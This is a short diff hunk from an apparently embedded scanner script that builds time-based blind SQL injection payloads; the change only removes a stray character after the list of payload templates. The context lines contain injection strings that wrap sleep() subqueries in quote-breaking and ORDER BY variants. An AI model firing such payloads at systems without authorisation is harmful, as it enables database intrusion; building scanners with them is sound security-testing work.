@@ -32,7 +32,7 @@ source: |
     "->test\"',(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z\"'",
     "->test\"' ASC, (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)) DESC-- z\"'",
     "->test\"') XOR (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z\"'"
-  );a
+  );
   
   // Build actual payloads by replacing placeholder with sleep time
   var payloads = payloadTemplates.stream()
